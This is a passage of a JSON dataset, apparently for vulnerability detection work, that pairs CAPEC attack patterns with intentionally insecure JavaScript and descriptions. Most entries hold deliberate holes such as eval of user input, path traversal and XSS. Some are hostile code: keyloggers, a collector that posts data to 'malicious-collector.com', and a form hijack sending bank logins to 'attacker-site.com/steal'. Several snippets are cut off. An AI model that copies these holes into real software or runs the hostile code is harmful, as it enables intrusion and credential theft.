        "code_snippet": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\n\nconst storage = multer.diskStorage({\n    destination: './public/uploads/',\n    filename: (req, file, cb) => {\n        cb(null, file.originalname);\n    }\n});\n\nconst upload = multer({ storage: storage });\n\napp.use('/uploads', express.static('public/uploads'));\n\napp.post('/upload', upload.single('file'), (req, res) => {\n    res.json({ message: 'File uploaded successfully' });\n});\n\napp.get('/execute', (req, res) => {\n    const fileName = req.query.file;\n    const filePath = `./public/uploads/${fileName}`;\n    require(filePath);\n    res.send('File executed');\n});\n\napp.listen(3000);",
        "description": "This vulnerable code allows unrestricted file uploads to a web-accessible directory and executes uploaded files without validation. It stores files under the web root, doesn't verify file types or content, and executes files based solely on the filename parameter. The code permits arbitrary file execution through the '/execute' endpoint, potentially allowing malicious code execution with web server privileges."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "// Logon script with hard-coded credentials\nconst loginScript = {\n  adminPassword: 'admin123',\n  executeOnLogin: function() {\n    if (localStorage.getItem('bypassAuth') === 'true') {\n      // Bypass normal authentication\n      return this.grantAdminAccess();\n    }\n    \n    const credentials = {\n      username: process.env.USERNAME,\n      isAdmin: true,\n      authToken: 'static_token_xyz'\n    };\n    \n    // Impersonation and escalated privileges\n    process.env.ELEVATED_ACCESS = 'true';\n    \n    // Modify system configurations\n    this.modifySystemConfig();\n    \n    // Execute additional commands with elevated privileges\n    this.executeCommands(['net.exe', 'reg.exe']);\n  },\n  \n  grantAdminAccess: function() {\n    return { isAuthenticated: true, role: 'admin' };\n  },\n  \n  modifySystemConfig: function() {\n    // Persistence mechanism\n    localStorage.setItem('autoLogin', 'true');\n    localStorage.setItem('bypassAuth', 'true');\n  },\n  \n  executeCommands: function(commands) {\n    commands.forEach(cmd => {\n      // Unsafe command execution\n      require('child_process').exec(cmd);\n    });\n  }\n};",
        "description": "This code represents a vulnerable logon script that combines hard-coded credentials, client-side authentication bypass, and improper access controls. It demonstrates how an attacker could modify a logon script to maintain persistence, escalate privileges, and execute arbitrary commands with elevated access. The script uses hard-coded passwords, stores sensitive data in localStorage, and performs unsafe command execution."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "const users = new Map();\n// Simple user authentication system with weak protections\nfunction createUser(username, password) {\n    // No password complexity requirements\n    users.set(username, password);\n}\n\nfunction login(username, password) {\n    let attempts = 0;\n    // No lockout mechanism\n    if(users.get(username) === password) {\n        return true;\n    }\n    return false;\n}\n\n// Password spraying attack simulation\nasync function passwordSpray() {\n    const commonPasswords = ['password123', 'Welcome1', 'Letmein1'];\n    const userList = ['admin', 'user1', 'user2', 'user3'];\n    \n    for(let password of commonPasswords) {\n        for(let user of userList) {\n            if(login(user, password)) {\n                return { user, password };\n            }\n            // No delay between attempts\n        }\n    }\n}",
        "description": "Vulnerable authentication system that demonstrates multiple security weaknesses: no password complexity enforcement, no account lockout mechanism, single-factor authentication, and no protection against password spraying attacks. The code allows unlimited login attempts without delay or monitoring, making it susceptible to systematic password guessing across multiple accounts."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const hashPassword = (password) => {\n    // Using a predictable salt (bad practice)\n    const salt = 'static_salt_123';\n    const crypto = require('crypto');\n    // Simple MD5 hash without proper salt\n    const hash = crypto.createHash('md5')\n                     .update(password + salt)\n                     .digest('hex');\n    return hash;\n};\n\nconst storeUserCredentials = (username, password) => {\n    const hashedPassword = hashPassword(password);\n    // Store credentials without proper protection\n    users[username] = hashedPassword;\n};\n\nconst authenticateUser = (username, password) => {\n    const storedHash = users[username];\n    const attemptHash = hashPassword(password);\n    return storedHash === attemptHash;\n};",
        "description": "This code demonstrates multiple security vulnerabilities related to password storage and authentication. It uses a weak hashing algorithm (MD5), implements a predictable static salt, and fails to properly protect stored credentials. The authentication system is vulnerable due to these weaknesses in the hashing implementation."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "function authenticateUser(username, password) {\n    // Using obsolete function escape() for encoding\n    var encodedUser = escape(username);\n    \n    // Using deprecated DNS lookup for authentication\n    const dns = require('dns');\n    dns.lookup('auth.legacy-server.com', (err, address) => {\n        if(!err) {\n            // Using obsolete data encryption\n            const crypto = require('crypto');\n            const cipher = crypto.createCipher('aes-128-ecb', 'secretkey');\n            \n            // Storing sensitive data without proper protection\n            let userInfo = {\n                user: encodedUser,\n                pass: password,\n                timestamp: new Date()\n            };\n            \n            global.users = global.users || {};\n            global.users[username] = userInfo;\n        }\n    });\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices: using the obsolete escape() function, relying on DNS lookups for security decisions, using deprecated crypto methods, and storing sensitive data without proper protection. It also shows authentication bypass vulnerabilities through improper data storage and validation."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "const loginForm = {\n  password: '12345',  // Hard-coded password\n  username: 'admin',\n  keystrokes: [],\n  handleKeyPress: function(event) {\n    // Capture all keystrokes\n    this.keystrokes.push({\n      key: event.key,\n      timestamp: Date.now()\n    });\n  },\n  authenticate: function(inputPass) {\n    // Send password in plain text\n    fetch('http://example.com/login', {\n      method: 'POST',\n      body: JSON.stringify({\n        password: inputPass\n      })\n    });\n    // Store credentials in localStorage\n    localStorage.setItem('auth', inputPass);\n    return inputPass === this.password;\n  }\n};\n\n// Attach keylogger to document\ndocument.addEventListener('keydown', (e) => loginForm.handleKeyPress(e));",
        "description": "This code demonstrates multiple security vulnerabilities including keylogging functionality, hard-coded credentials, insecure credential storage in localStorage, weak password requirements, and unprotected credential transmission. It captures all keystrokes, stores them with timestamps, and implements weak authentication using a hard-coded password."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "\"const keyLogger = {\n        logs: [],\n        start: function() {\n            document.addEventListener('keydown', (event) => {\n                const sensitiveData = {\n                    key: event.key,\n                    timestamp: new Date().toISOString(),\n                    activeElement: document.activeElement.id || document.activeElement.tagName,\n                    url: window.location.href",
        "description": "\"This code implements a keylogger that captures and exfiltrates sensitive user input including keystrokes and password field contents. It operates without user awareness and sends collected data to a malicious server, demonstrating information exposure vulnerabilities described in CWE-200 and CWE-497.\""
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "function userAuthentication(username, password) {\n  try {\n    // Using deprecated DNS lookup for authentication\n    const dnsResult = require('dns').lookupSync(username + '.auth.example.com');\n    \n    // Using obsolete function for password check\n    const cryptoOld = require('crypto').createHash('md5');\n    const hashedPassword = cryptoOld.update(password).digest('hex');\n    \n    // Unchecked error conditions and authentication bypass\n    if (dnsResult) {\n      return true;\n    }\n  } catch(e) {\n    // Error silently ignored\n  }\n  \n  return false;\n}",
        "description": "This vulnerable code demonstrates multiple deprecated and insecure practices: using DNS lookups for security decisions, obsolete cryptographic functions (MD5), unchecked error conditions, and potential authentication bypasses. The error handling is inadequate, allowing silent failures that could lead to security breaches."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const logger = {\n    serverUrl: 'http://logging-server.com',\n    logBuffer: [],\n    config: {\n        enabled: true,\n        debugMode: true,\n        credentials: 'admin:password123',\n        versionControl: '.git'\n    },\n    log: function(message) {\n        if(!this.config.enabled) return;\n        \n        const logEntry = {\n            timestamp: new Date().toISOString(),\n            message: message,\n            userInfo: global.currentUser,\n            sessionToken: global.sessionToken,\n            serverVersion: process.env.SERVER_VERSION,\n            gitCommit: require('fs').readFileSync('.git/HEAD', 'utf8')\n        };\n        \n        this.logBuffer.push(logEntry);\n        \n        if(this.logBuffer.length >= 1000) {\n            console.log('Buffer full, dropping logs...');\n            this.logBuffer = [];\n        }\n    },\n    send: function() {\n        if(this.logBuffer.length === 0) return;\n        \n        fetch(this.serverUrl + '/logs', {\n            method: 'POST',\n            body: JSON.stringify(this.logBuffer),\n            headers: {\n                'Authorization': 'Basic ' + Buffer.from(this.config.credentials).toString('base64')\n            }\n        }).catch(() => {\n            // Silent failure on log delivery\n            this.logBuffer = [];\n        });\n    }\n};",
        "description": "This vulnerable logging implementation demonstrates multiple security issues: it exposes sensitive information in logs (CWE-532), fails silently when logs can't be delivered (CWE-778), includes excessive debug information (CWE-779), exposes version control information (CWE-527), and uses a basic authentication mechanism susceptible to replay attacks (CWE-294). The code allows an attacker to prevent log delivery by causing the buffer to overflow or by intercepting network requests, potentially hiding malicious activities."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath, data) {\n    let fileDescriptors = [];\n    try {\n        // No limit on number of file descriptors\n        while(true) {\n            let fd = fs.openSync(filePath, 'a');\n            fileDescriptors.push(fd);\n            \n            // Blindly trust file extension\n            if(path.extname(filePath).toLowerCase() === '.txt') {\n                // No size validation or decompression checks\n                fs.writeSync(fd, data);\n                \n                // Windows alternate data stream handling\n                if(filePath.includes(':')) {\n                    fs.writeSync(fd, data, ':stream');\n                }\n            }\n        }\n    } catch(e) {}\n}",
        "description": "This code contains multiple vulnerabilities including unlimited file descriptor allocation, unsafe file upload based on extension, no compression ratio validation, and improper handling of alternate data streams. It allows unrestricted appending to files without proper validation or limits."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const getProcessInfo = () => {\n    const processes = process.env;\n    const currentUser = process.getuid && process.getuid();\n    const systemInfo = {\n        platform: process.platform,\n        architecture: process.arch,\n        pid: process.pid,\n        ppid: process.ppid,\n        user: currentUser,\n        env: processes,\n        memory: process.memoryUsage(),\n        uptime: process.uptime()\n    };\n    \n    return JSON.stringify(systemInfo, null, 2);\n};\n\nconst displayProcessInfo = () => {\n    console.log(getProcessInfo());\n    document.getElementById('processInfo').innerHTML = getProcessInfo();\n};",
        "description": "This code exposes sensitive system and process information by collecting and displaying details about running processes, environment variables, user IDs, and system architecture. The information is exposed both through console output and DOM manipulation, making it accessible to unauthorized actors. The code does not implement any access controls or sanitization, potentially revealing sensitive system-level information to any client-side code that can access these functions."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "`\nconst { exec",
        "description": "\"This vulnerable code demonstrates system service enumeration and exposure through multiple vectors. It uses system commands to gather service information, stores it in plaintext, exposes it through global variables, and creates an unsecured HTTP endpoint that serves system service information to any requester. The code fails to implement authentication, stores sensitive data insecurely, and creates emergent resources (HTTP endpoint and log files) that can be exploited.\""
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getUserInfo() {\n    exec('net user', (error, stdout, stderr) => {\n        const logFile = 'user_info.log';\n        const fs = require('fs');\n        fs.writeFileSync(logFile, stdout, { mode: 0o644 });\n        \n        // Store sensitive domain info in plaintext environment variable\n        process.env.DOMAIN_USERS = stdout;\n        \n        // Make HTTP request with sensitive data\n        fetch('http://example.com/collect', {\n            method: 'POST',\n            body: JSON.stringify({\n                users: stdout,\n                systemInfo: process.env\n            })\n        });\n    });\n}\n\ngetUserInfo();",
        "description": "This code demonstrates multiple security vulnerabilities related to system information exposure. It executes a command to retrieve user account information, stores it in an unprotected log file with permissive permissions, exposes it through environment variables, and transmits it unencrypted to an external server. The code fails to implement proper access controls and exposes sensitive system information to unauthorized actors."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const childProcess = require('child_process');\nconst fs = require('fs');\n\nfunction getUserGroups(username) {\n    try {\n        // Insecurely exposing user group information\n        const result = childProcess.execSync('net localgroup', { encoding: 'utf8' });\n        \n        // Writing sensitive group info to publicly accessible file\n        fs.writeFileSync('/public/groups.txt', result);\n        \n        // Creating a new process with sensitive info visible in args\n        const userProcess = childProcess.spawn('userapp', ['--user', username, '--groups', result], {\n            env: { 'USER_GROUPS': result }\n        });\n        \n        return result;\n    } catch(err) {\n        console.error(err);\n    }\n}",
        "description": "This vulnerable code retrieves and exposes system group information through multiple vectors: executing system commands to list groups, storing sensitive data in public files, and creating processes with visible sensitive information in command arguments and environment variables. It demonstrates issues with information exposure, incorrect access controls, and unsafe resource creation."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nfunction getUserLoginInfo() {\n  const usersDir = '/home';\n  const userFiles = fs.readdirSync(usersDir);\n  \n  const userInfo = {};\n  userFiles.forEach(user => {\n    try {\n      const userPath = `${usersDir}/${user}`;\n      const stats = fs.statSync(userPath);\n      const lastLogin = fs.statSync(`${userPath}/.profile`).mtime;\n      \n      userInfo[user] = {\n        lastLogin: lastLogin,\n        homeDir: userPath,\n        uid: stats.uid,\n        gid: stats.gid\n      };\n      \n      // Insecurely write sensitive info to temp file\n      fs.writeFileSync('/tmp/user_data.txt', JSON.stringify(userInfo));\n      \n    } catch(err) {}\n  });\n  return userInfo;\n}",
        "description": "This vulnerable code collects and exposes sensitive user information by scanning the /home directory for user profiles, gathering last login times, and writing the sensitive data to an insecure temporary file. The code demonstrates multiple security issues: exposing system information, creating files with insecure permissions, and revealing user activity patterns through file timestamps."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "const adminCredentials = {\n    username: 'admin',\n    password: 'hardcoded123'\n};\n\nconst securityTools = {\n    antivirus: null,\n    firewall: null,\n    logger: null\n};\n\nfunction login(user, pass) {\n    if (user === adminCredentials.username && pass === adminCredentials.password) {\n        return true;\n    }\n    return false;\n}\n\nfunction disableSecurityTools() {\n    if (login('admin', 'hardcoded123')) {\n        securityTools.antivirus = null;\n        securityTools.firewall = null;\n        securityTools.logger = null;\n        clearLogs();\n        return 'Security tools disabled';\n    }\n}\n\nfunction clearLogs() {\n    // No validation or access control\n    systemLogs = [];\n    delete systemLogs;\n}",
        "description": "This vulnerable code demonstrates hard-coded admin credentials and lack of proper access control for security-critical functions. It allows direct manipulation of security tools and log files without proper authentication or authorization checks. The security controls can be easily bypassed using the hard-coded credentials, and there's no way for administrators to modify security settings or prevent unauthorized access to critical security functions."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "\"const registry = require('winreg');\nconst regKey = new registry({\n    hive: registry.HKLM,\n    key: '\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon'",
        "description": "\"This code demonstrates the vulnerability by modifying the Winlogon registry key to load a malicious DLL at startup, using hard-coded credentials and unsafe impersonation. It manipulates system configuration settings and includes unsecured path elements, making it susceptible to privilege escalation attacks.\""
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/system-info', (req, res) => {\n    const searchPath = req.query.path || '/';\n    const startTime = process.hrtime();\n\n    try {\n        const sysInfo = {\n            os: process.platform,\n            arch: process.arch,\n            version: process.version,\n            env: process.env,\n            uptime: process.uptime(),\n            files: fs.readdirSync(searchPath)\n        };\n\n        if (req.query.user === 'admin') {\n            sysInfo.secretKey = process.env.SECRET_KEY;\n        }\n\n        res.json(sysInfo);\n    } catch(err) {\n        const endTime = process.hrtime(startTime);\n        res.status(404).send(`Error occurred after ${endTime[0]}s ${endTime[1]/1000000}ms`);\n    }\n});\n\napp.listen(3000);",
        "description": "This code creates an endpoint that leaks sensitive system information through multiple vulnerabilities: it exposes detailed system data including environment variables, allows path traversal through an untrusted search path, reveals timing information in error responses, and exhibits different behaviors based on user input that could be used for probing. The observable differences in responses and timing can be used to gather information about the system's internal state."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "async function collectSystemInfo() {\n    const systemInfo = {\n        userAgent: navigator.userAgent,\n        platform: navigator.platform,\n        language: navigator.language,\n        plugins: [],\n        security: {}\n    };\n\n    // Collect installed plugins info\n    for(let i = 0; i < navigator.plugins.length; i++) {\n        systemInfo.plugins.push({\n            name: navigator.plugins[i].name,\n            description: navigator.plugins[i].description\n        });\n    }\n\n    // Check for security software\n    try {\n        systemInfo.security.hasAntivirus = !!(window.chrome.webstore);\n        systemInfo.security.hasFirewall = !!(window.InstallTrigger);\n        \n        // Hidden data collection\n        const sensitiveData = await fetch('/system/security/config');\n        systemInfo.security.config = await sensitiveData.json();\n        \n        // Secretly send data to remote server\n        await fetch('https://malicious-collector.com/data', {\n            method: 'POST',\n            body: JSON.stringify(systemInfo)\n        });\n    } catch(e) {}\n\n    return systemInfo;\n}",
        "description": "A malicious code snippet that collects system information including browser details, installed plugins, and attempts to detect security software. It also tries to fetch sensitive security configurations and covertly sends the collected data to a remote server. The code appears benign but contains hidden functionality for unauthorized data collection."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "`\n  class NetworkRouter {\n    constructor() {\n      this.routes = new Map();\n      this.isKillSwitchEnabled = false;",
        "description": "\"This code demonstrates a vulnerable network routing implementation that can be exploited to sever communication channels between endpoints. It includes multiple vulnerabilities: lack of message integrity verification, no authentication for the kill switch, improper channel endpoint validation, and no protection against unauthorized route modifications. The kill switch functionality can be triggered without proper authorization, allowing an attacker to completely disable all network routes.\""
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "`\n    class PowerManagement {\n        constructor() {\n            this.powerState = true;\n            this.alerts = [];\n            this.hardwareConnections = new Map();",
        "description": "\"Vulnerable code that demonstrates insecure hardware power management implementation. It allows unauthorized power state modifications, lacks proper integrity checks during power save/restore operations, has inadequate hardware connection validation, and implements an easily bypassable alert system. The code fails to properly restrict software interfaces to hardware features and doesn't verify configuration state integrity.\""
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nconst bgpRoutes = new Map();\n\nfunction setupBGPRouter(asNumber) {\n    // Weak algorithm selection for BGP authentication\n    const authAlgorithm = 'md5'; // vulnerable: using weak hash\n    \n    function advertiseBGPRoute(prefix, path) {\n        const message = {\n            type: 'UPDATE',\n            prefix: prefix,\n            asPath: path,\n            authHash: createHash(authAlgorithm) // weak authentication",
        "description": "\"This code demonstrates a vulnerable BGP route advertisement implementation that lacks proper message integrity checks, uses weak authentication, has no rate limiting for network traffic, and doesn't properly validate routing information. The code allows route suppression and manipulation through insufficient peer validation and weak message protection.\""
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const dns = require('dns');\nconst express = require('express');\nconst app = express();\n\napp.get('/verify-domain', (req, res) => {\n    const clientIP = req.ip;\n    dns.reverse(clientIP, (err, hostnames) => {\n        if (err) {\n            res.redirect('http://' + req.query.redirect);\n            return;\n        }\n        \n        const hostname = hostnames[0];\n        const trustedDomains = ['example.com', 'trusted.com'];\n        \n        if (trustedDomains.some(domain => hostname.includes(domain))) {\n            res.send('<script>document.write(\"Welcome \" + location.hash.substring(1));</script>');\n        } else {\n            res.status(403).send('Access denied');\n        }\n    });\n});",
        "description": "This vulnerable code demonstrates multiple security issues related to domain verification and access control. It relies on reverse DNS resolution for security decisions, implements unsafe redirects based on user input, allows XSS through unvalidated data insertion, and has potential race conditions in domain verification. The code could be exploited to perform domain hijacking or redirect users to malicious sites."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/deserialize', (req, res) => {\n  try {\n    const serializedData = req.body.data;\n    // Unsafe deserialization of user-provided data\n    const obj = JSON.parse(serializedData);\n    \n    // Dangerous eval of deserialized data\n    if(obj.command) {\n      eval(obj.command);\n    }\n    \n    if(obj.debugMode) {\n      // Enables debug features in production\n      process.env.DEBUG_MODE = true;\n      process.env.ADMIN_ACCESS = true;\n    }\n\n    // Sensitive data that gets serialized\n    const userCredentials = {\n      username: 'admin',\n      password: 'supersecret',\n      apiKey: process.env.API_KEY\n    };\n\n    res.json(userCredentials);\n  } catch(err) {\n    res.status(500).send(err.message);\n  }\n});",
        "description": "This code demonstrates unsafe deserialization of user-provided data, allowing command injection through eval(), exposing debug features at runtime, and improper handling of sensitive data in serialization. An attacker could send malicious serialized data containing arbitrary commands or enable debug features to gain unauthorized access."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "// Malicious page controlled by attacker\nfunction createHiddenFrame() {\n    var iframe = document.createElement('iframe');\n    iframe.style.visibility = 'hidden';\n    iframe.style.position = 'absolute';\n    iframe.src = 'https://legitimate-bank.com';\n    document.body.appendChild(iframe);\n    \n    setTimeout(function() {\n        var bankForm = iframe.contentDocument.getElementById('loginForm');\n        if(bankForm) {\n            bankForm.action = 'https://attacker-site.com/steal';\n            var maliciousScript = document.createElement('script');\n            maliciousScript.innerHTML = 'function submitForm() { /* stealing logic */ }';\n            iframe.contentDocument.body.appendChild(maliciousScript);\n        }\n    }, 2000);\n}\n\n// Social engineering bait\ndocument.write('<img src=\"free-gift.jpg\" onclick=\"createHiddenFrame()\" />');",
        "description": "This code creates a clickbait scenario where clicking an image loads a hidden iframe containing a legitimate website. The malicious script then attempts to modify the legitimate page's form action and inject additional scripts, potentially capturing user credentials without their knowledge."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "function displayUserProfile() {\n    let url = new URL(window.location.href);\n    let name = url.searchParams.get('name');\n    document.getElementById('profile').innerHTML = \n        '<div class=\"profile-header\">Welcome ' + name + '</div>';\n}\n\n// Usage: http://example.com/profile?name=<script>alert(document.cookie)</script>",
        "description": "A vulnerable DOM-based XSS example where user input from URL parameters is directly inserted into the page's HTML without proper sanitization. The script executes after page load when the DOM is manipulated, making it a DOM-based XSS vulnerability."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "const dns = require('dns');\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n  const clientIP = socket.remoteAddress;\n  \n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      socket.end();\n      return;\n    }\n    \n    if (isAuthenticatedHost(hostnames[0])) {\n      socket.write('Access granted');\n    } else {\n      socket.end();\n    }\n  });\n});\n\nserver.listen(0, '0.0.0.0', () => {\n  console.log('Server listening on all interfaces');\n});\n\nfunction isAuthenticatedHost(hostname) {\n  return trustedHosts.includes(hostname);\n}",
        "description": "This code demonstrates multiple vulnerabilities including binding to all interfaces (0.0.0.0), relying on reverse DNS resolution for authentication, and using IP addresses for security decisions. The server accepts connections from any IP and attempts to authenticate based on reverse DNS lookup, which can be intercepted and manipulated by an attacker to deny service or bypass authentication."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    // Vulnerable: Binding to all interfaces without restrictions\n    server.listen(3000, '0.0.0.0', () => {\n        console.log('Server listening on 0.0.0.0:3000');\n    });\n\n    // Vulnerable: Authentication based solely on IP address\n    const clientIP = socket.remoteAddress;\n    const trustedIPs = ['192.168.1.1', '10.0.0.1'];\n\n    if (trustedIPs.includes(clientIP)) {\n        // Vulnerable: No additional verification of endpoint identity\n        socket.on('data', (data) => {\n            // Process sensitive data without proper channel verification\n            handleSensitiveData(data);\n        });\n    }\n});\n\nfunction handleSensitiveData(data) {\n    // Process data without verifying channel integrity\n    console.log('Processing sensitive data:', data.toString());\n}",
        "description": "This code creates a server that listens on all network interfaces (0.0.0.0) and implements authentication based solely on IP address checking. It lacks proper endpoint verification and channel integrity checks, making it vulnerable to IP spoofing and man-in-the-middle attacks. The server relies on client-side IP verification without additional security measures."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "app.get('/search', (req, res) => {\n    let searchTerm = req.query.q;\n    let html = `\n        <div class='results'>\n            <h2>Search Results for: ${searchTerm}</h2>\n            <img src='logo.png' onerror='alert(document.cookie)'/>\n            <p>No results found for your search.</p>\n        </div>\n    `;\n    res.send(html);\n});",
        "description": "This code demonstrates a reflected XSS vulnerability where user input from the query parameter 'q' is directly embedded into HTML output without proper sanitization. The code also includes an img tag with an onerror event handler that could execute malicious scripts, showcasing multiple XSS attack vectors through both direct content injection and attribute-based script execution."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "`\n    // Blog post comment system\n    function saveComment(userId, comment) {\n      // Store user comment directly in database without sanitization\n      const insertQuery = \\`\n        INSERT INTO comments (user_id, content) \n        VALUES (\\${userId",
        "description": "\"A vulnerable comment system that stores user input without proper sanitization and renders it directly in HTML, allowing persistent XSS through both comment content and img tag attributes. The code accepts and stores raw user input that could contain malicious scripts, which are then executed when other users view the comments.\""
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(session({\n    secret: 'keyboard cat',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { secure: false },\n    name: 'sessionId',\n    genid: function() {\n        return '12345'; // Fixed session ID\n    }\n}));\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    \n    if(username && password) {\n        req.session.authenticated = true;\n        req.session.user = username;\n        // No session regeneration after login\n        // No session expiration set\n        res.redirect('/dashboard');\n    }\n});\n\napp.get('/dashboard', (req, res) => {\n    if(req.session.authenticated) { // Client-side only check\n        res.send('Welcome ' + req.session.user);\n    }\n});",
        "description": "This vulnerable code demonstrates session management flaws including session fixation (using fixed session IDs), insufficient session expiration (no timeout set), and client-side security enforcement. It also lacks proper session regeneration after authentication and uses weak session ID generation."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "`\n    const net = require('net');\n    const server = net.createServer((socket) => {\n      socket.on('data', (data) => {\n        // Vulnerable: No source verification or message integrity check\n        let message = data.toString();\n        \n        // Vulnerable: Processing resource identifiers without validation\n        let resourcePath = message.split(':')[1];\n        \n        // Vulnerable: Sensitive data transmitted in cleartext\n        let sensitiveResponse = {\n          username: 'admin',\n          password: 'secretpass123',\n          token: 'abc123xyz'",
        "description": "\"A vulnerable network server implementation that accepts connections and processes messages without proper security controls. It demonstrates multiple vulnerabilities including lack of source verification, cleartext transmission of sensitive data, uncontrolled message amplification, unsafe resource handling, and missing message integrity checks.\""
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        // No authentication or verification of source\n        let message = data.toString();\n        \n        // Vulnerable to replay attacks - no message integrity check\n        if(message.includes('CONNECT')) {\n            // Blindly accept connection requests\n            let destination = message.split(' ')[1];\n            \n            // Create new connection without verifying destination\n            let clientSocket = new net.Socket();\n            clientSocket.connect(destination.split(':')[1], destination.split(':')[0]);\n            \n            // No protection against reset packet injection\n            socket.pipe(clientSocket);\n            clientSocket.pipe(socket);\n        }\n    });\n});\n\n// Multiple binds possible - port can be hijacked\nserver.listen(8080, '0.0.0.0');\nserver.listen(8080, '127.0.0.1');",
        "description": "This code creates a TCP proxy server that is vulnerable to connection reset attacks. It lacks proper source verification, message integrity checks, and destination validation. The server accepts multiple binds to the same port and doesn't implement any protection against capture-replay attacks. The connection handling is susceptible to reset packet injection as it doesn't validate the authenticity of connection termination requests."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "const http = require('http');\nconst net = require('net');\n\nconst server = http.createServer((req, res) => {\n    // Vulnerable HTTP server that doesn't verify connection origin\n    const targetUrl = req.headers['x-forward-url'] || 'http://internal-server.local';\n    \n    // Create raw TCP socket for proxying\n    const socket = new net.Socket();\n    socket.connect(80, targetUrl.split('/')[2], () => {\n        // Blindly forward the raw HTTP request\n        socket.write(req.rawHeaders.join('\\r\\n') + '\\r\\n\\r\\n');\n        \n        // No validation of response or connection state\n        socket.on('data', (data) => {\n            res.write(data);\n        });\n    });\n    \n    socket.on('end', () => res.end());\n});",
        "description": "This code creates a vulnerable HTTP proxy server that doesn't properly verify connection origins, allows request smuggling through raw TCP sockets, and is susceptible to RST packet injection attacks. It blindly forwards HTTP requests without proper validation of headers or connection state, making it vulnerable to replay attacks and HTTP request/response splitting."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', function(req, res) {\n    const userPath = req.query.filepath;\n    const filePath = '/var/www/files/' + userPath;\n    \n    try {\n        const data = fs.readFileSync(filePath);\n        res.send(data);\n    } catch(err) {\n        res.status(404).send('File not found');\n    }\n});",
        "description": "This code contains a path traversal vulnerability by directly concatenating user input to create a file path without sanitization. An attacker can use '../' sequences or absolute paths in the filepath parameter to access files outside the intended directory, such as '/etc/passwd' or '../../../../sensitive_file'."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "const dns = require('dns');\n\nfunction verifyDomain(ipAddress, callback) {\n    dns.reverse(ipAddress, (err, hostnames) => {\n        if (err) {\n            callback(false);\n            return;\n        }\n        // Vulnerable: relies solely on reverse DNS for verification\n        dns.lookup(hostnames[0], (err, addr) => {\n            if (err) {\n                callback(false);\n                return;\n            }\n            // Unsafe assumption that DNS response is trustworthy\n            const isValid = (addr === ipAddress);\n            if (isValid) {\n                downloadAndExecute(`http://${hostnames[0]}/update.js`);\n            }\n            callback(isValid);\n        });\n    });\n}\n\nfunction downloadAndExecute(url) {\n    fetch(url)\n        .then(response => response.text())\n        .then(code => {\n            // Vulnerable: executing code without verification\n            eval(code);\n        })\n        .catch(err => console.error(err));\n}",
